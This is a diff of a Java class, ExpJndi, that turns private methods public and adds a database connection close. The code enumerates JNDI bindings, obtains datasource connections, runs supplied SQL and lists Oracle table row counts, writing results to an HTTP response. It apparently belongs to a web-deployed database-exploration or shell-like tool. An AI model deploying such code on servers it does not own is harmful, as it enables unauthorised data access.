@@ -29,7 +29,7 @@ public class ExpJndi {
 	OutputStream out;
 	HttpSession session;
 
-	private void print(String s){
+	public void print(String s){
 		try {
 		if (null != out && null != s)
 			out.write(s.getBytes());
@@ -95,12 +95,18 @@ public class ExpJndi {
 				} catch (Throwable e) {
 					log(e);
 				}
+			if (null != connection)
+				try {
+					connection.close();
+				} catch (Throwable e) {
+					log(e);
+				}
 		}
 	}
 
 	Connection connection = null;
 
-	private void doSql(String sql) throws Exception {
+	public void doSql(String sql) throws Exception {
 		PreparedStatement prep = null;
 		if (null != connection && null != sql) {
 			prep = connection.prepareStatement(sql);
@@ -108,7 +114,7 @@ public class ExpJndi {
 		}
 	}
 
-	private void doCount() throws Exception {
+	public void doCount() throws Exception {
 		doSql("select owner,TABLE_NAME,NUM_ROWS from all_tables where NUM_ROWS >6 order by num_rows desc");
 	}
 
@@ -134,7 +140,7 @@ public class ExpJndi {
 			doSql(sql);
 	}
 
-	private ArrayList<String> listContext(Context ctx, String indent, ArrayList<String> output) throws NamingException {
+	public ArrayList<String> listContext(Context ctx, String indent, ArrayList<String> output) throws NamingException {
 		String name = "";
 		try {
 			NamingEnumeration list = ctx.listBindings("");
@@ -219,7 +225,7 @@ public class ExpJndi {
 		return false;
 	}
 
-	private void log(Throwable e) {
+	public void log(Throwable e) {
 		if (null != response)
 			try {
 				if(null != e && null != e.getMessage())
@@ -229,7 +235,7 @@ public class ExpJndi {
 			}
 	}
 
-	private Connection getConnection(String s) {
+	public Connection getConnection(String s) {
 		if (connection == null)
 			try {
 				InitialContext context = new InitialContext();
